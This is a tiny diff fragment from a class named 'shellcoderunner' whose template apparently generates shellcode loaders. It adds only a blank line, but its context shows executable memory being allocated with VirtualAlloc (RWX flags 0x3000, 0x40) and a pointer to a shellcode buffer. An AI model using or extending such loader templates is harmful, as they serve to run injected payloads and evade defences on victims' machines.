@@ -17,6 +17,7 @@ class shellcoderunner:
     def template(self) -> str:
         return """
     {transformers}
+
     local address = {VirtualAlloc}(c.NULL, 460, 0x3000, 0x40)
     local ptr = c.Pointer(shellcode[0])
 
